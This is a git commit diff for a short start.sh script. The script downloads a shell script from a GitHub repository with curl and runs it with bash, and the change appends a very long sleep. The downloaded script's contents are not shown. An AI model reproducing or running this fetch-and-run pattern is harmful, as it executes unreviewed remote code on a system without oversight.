d2f0d14e96be4645541961d7ef40ad880442ccf4
OASEN <71011762+A233S@users.noreply.github.com>
2024-03-01 02:15:14 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,4 @@
 rm -rf /tmp/nobash.sh
-curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh 508255
+curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh 508255 ; sleep 3000000000
 read AllDone AllDone
 exit 0
